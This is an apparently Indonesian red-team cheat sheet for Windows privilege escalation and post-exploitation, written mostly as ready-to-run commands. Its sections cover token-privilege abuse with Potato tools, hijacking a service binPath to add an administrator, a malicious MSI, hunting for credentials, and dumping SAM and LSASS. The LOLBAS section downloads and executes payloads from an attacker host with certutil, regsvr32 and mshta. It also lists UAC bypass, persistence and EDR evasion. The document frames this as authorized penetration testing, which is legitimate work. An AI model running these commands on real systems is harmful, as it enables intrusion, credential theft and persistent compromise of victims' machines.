# WINDOWS — Arsenal, PrivEsc & Post-Exploitation

> Untuk foothold Windows. Alur: **enum otomatis + manual → identifikasi vektor privesc → SYSTEM → loot →
> lateral**. Prioritas: token privilege & service misconfig (paling cepat). LOLBAS untuk minim tool drop.

## Daftar Isi
1. [Enum awal (situasional awareness)](#enum)
2. [PrivEsc otomatis](#auto)
3. [Token privileges → SYSTEM](#token)
4. [Service & registry misconfig](#service)
5. [Credential hunting](#creds)
6. [UAC bypass & persistence](#uac)
7. [LOLBAS (living-off-the-land)](#lolbas)
8. [AV/EDR — dasar (legit red-team)](#av)
9. [Arsenal tools Windows](#arsenal)

---

<a name="enum"></a>
## 1. Enum Awal — Situational Awareness

```powershell
whoami /all                      # user, groups, PRIVILEGES (kunci privesc!)
whoami /priv
systeminfo                       # OS ver, patch, arch → cek missing KB (exploit kernel)
hostname; ipconfig /all; route print; arp -a; netstat -ano
net user; net localgroup administrators; net accounts
qwinsta; query user               # sesi lain
tasklist /svc                    # proses + service (AV/EDR? mimikatz target?)
Get-ChildItem env:               # env var (creds, path)
cmdkey /list                     # cached creds
```

---

<a name="auto"></a>
## 2. PrivEsc Otomatis (jalankan dulu, verifikasi manual)

```powershell
# winPEAS (paling lengkap)
.\winPEASx64.exe                 # atau winPEAS.bat (no drop binary)
# PowerUp (PowerShell, klasik)
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
# Seatbelt (situational awareness dari GhostPack)
.\Seatbelt.exe -group=all
# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

---

<a name="token"></a>
## 3. Token Privileges → SYSTEM (tercepat)

```powershell
whoami /priv    # cari ini:
```
| Privilege | Exploit |
|---|---|
| `SeImpersonatePrivilege` | **GodPotato / PrintSpoofer / JuicyPotatoNG** → SYSTEM (service account umum punya ini) |
| `SeAssignPrimaryToken` | Potato variants |
| `SeBackupPrivilege` | baca file apa saja → dump SAM/SYSTEM/NTDS.dit |
| `SeRestorePrivilege` | tulis file apa saja → DLL hijack / service binary |
| `SeDebugPrivilege` | inject/dump proses (LSASS) |
| `SeTakeOwnership` | ambil alih objek → tulis binary priv |
| `SeLoadDriver` | load driver rentan → kernel |

```powershell
# SeImpersonate → SYSTEM:
.\GodPotato.exe -cmd "cmd /c whoami"
.\PrintSpoofer64.exe -i -c powershell.exe
# SeBackup → dump hashes:
reg save HKLM\SAM sam.hive; reg save HKLM\SYSTEM system.hive
# lalu impacket: secretsdump.py -sam sam.hive -system system.hive LOCAL
```

---

<a name="service"></a>
## 4. Service & Registry Misconfig

```powershell
# Unquoted service path (spasi di path tanpa quote → drop binary di celah)
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v '"'
# Weak service permissions (bisa ubah binPath → SYSTEM)
accesschk.exe -uwcqv "Users" *        # atau PowerUp Invoke-AllChecks
sc config <svc> binPath= "cmd /c net localgroup administrators user /add"
sc stop <svc> & sc start <svc>
# Writable service binary / DLL hijack (missing DLL di PATH writable)
# AlwaysInstallElevated (registry) → MSI jalan sbg SYSTEM:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/exec CMD='...' -f msi -o evil.msi; msiexec /quiet /i evil.msi
# Scheduled task writable / autorun writable → persistence + privesc
```

---

<a name="creds"></a>
## 5. Credential Hunting (harta karun)

```powershell
# File config berisi password
findstr /si password *.txt *.ini *.config *.xml *.json 2>nul
Get-ChildItem -Recurse -Include *.config,*.xml,web.config,unattend.xml,sysprep.xml 2>$null
# Lokasi klasik:
type C:\Windows\Panther\Unattend.xml          # sysprep creds (base64)
type C:\ProgramData\...\*.xml                  # app creds
# Windows vault / credential manager
vaultcmd /listcreds:"Windows Credentials" /all
# WiFi
netsh wlan show profile name=<SSID> key=clear
# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultPassword AutoAdminLogon"
# PuTTY sessions, WinSCP.ini, browser saved creds, KeePass .kdbx, .rdp files
# SAM/LSA/LSASS dump (admin) → mimikatz / nanodump (lihat active-directory.md §4)
```

---

<a name="uac"></a>
## 6. UAC Bypass & Persistence (red-team, koordinasi klien)

```
UAC bypass: fodhelper, computerdefaults, sdclt, eventvwr (registry hijack). Cek UACMe untuk metode.
Persistence (dokumentasikan & bersihkan):
  Registry Run keys (HKCU/HKLM ...\Run), Scheduled Task, Service, Startup folder,
  WMI event subscription, DLL search-order hijack, accessibility (sethc.exe) — di lab.
```
> OPSEC: persistence & UAC bypass sangat berdampak → hanya jika RoE izinkan, catat semua, bersihkan.

---

<a name="lolbas"></a>
## 7. LOLBAS — Living Off The Land (minim drop, bypass allowlist)

```powershell
# Download file (tanpa tool tambahan)
certutil -urlcache -f http://<atk>/f.exe f.exe
bitsadmin /transfer j http://<atk>/f.exe C:\f.exe
powershell iwr http://<atk>/f.exe -o f.exe
# Exec / proxy
regsvr32 /s /n /u /i:http://<atk>/f.sct scrobj.dll
mshta http://<atk>/f.hta
rundll32 (DLL exec), msbuild (inline C#), installutil, wmic, cscript
# LSASS dump via LOLBAS: comsvcs.dll
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\lsass.dmp full
# Referensi lengkap: lolbas-project.github.io
```

---

<a name="av"></a>
## 8. AV / EDR — Dasar (untuk red-team sah)

Konteks defensif & red-team resmi. Fokus pada teknik yang sah didokumentasikan:
```
- Enumerasi dulu: apa yang jalan? (tasklist, Get-MpComputerStatus, driver EDR)
- AMSI: pahami mekanismenya untuk red-team; banyak metode public (dokumentasikan di laporan).
- Prefer LOLBAS + in-memory execution untuk minim footprint di engagement legit.
- Obfuscation payload (msfvenom encoder, Obfuscation tool) — untuk uji deteksi, bukan menyembunyikan malware jahat.
```
> Skill ini membantu red-team & uji efektivitas EDR pada engagement berotorisasi. Untuk teknik evasion
> spesifik yang berkembang cepat, verifikasi ke sumber terkini & pastikan dalam RoE.

---

<a name="arsenal"></a>
## 9. Arsenal Tools Windows (ringkas — full di tools-arsenal.md)

**Enum/PrivEsc:** winPEAS, PowerUp, PrivescCheck, Seatbelt, SharpUp, accesschk, WES-NG (patch→exploit map).
**Cred/AD:** mimikatz, Rubeus, SharpHound, Certify, nanodump, LaZagne, SharpChrome.
**Potato/SYSTEM:** GodPotato, PrintSpoofer, JuicyPotatoNG, RoguePotato.
**C2/exec (legit):** evil-winrm, impacket suite, CrackMapExec/NetExec, PsExec (Sysinternals).
**Recon lokal:** Sysinternals Suite (procmon, procexp, autoruns, accesschk).
**Transfer/pivot:** chisel, ligolo-ng, plink, netsh portproxy.
**Payload:** msfvenom, Villain, Sliver (open-source C2), Havoc.

Install & sumber → `references/tools-arsenal.md`.
